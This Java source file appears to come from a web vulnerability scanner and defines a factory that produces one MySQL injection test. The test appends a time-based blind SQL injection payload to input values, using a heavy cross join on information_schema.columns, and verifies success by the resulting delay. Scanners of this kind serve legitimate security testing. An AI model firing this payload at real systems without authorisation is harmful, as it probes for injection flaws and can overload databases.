/*
 * Copyright 2015 Mariusz.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.watchrabbit.scanner.attacker.attack;

import com.watchrabbit.scanner.attacker.model.Attack;
import com.watchrabbit.scanner.attacker.verify.MySqlHeavyQueryVerificationStrategy;
import org.springframework.stereotype.Component;

/**
 *
 * @author Mariusz
 */
@Component
public class MySQLHeavyQueryFactory implements AttackFactory {

    @Override
    public Attack produce() {
        return new Attack.Builder()
                .withAttackGenerator(value
                        -> value + "' and (select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2) and 1='1"
                ).withId("injectionMysql1")
                .withVerificationStrategy(new MySqlHeavyQueryVerificationStrategy())
                .build();
    }

}
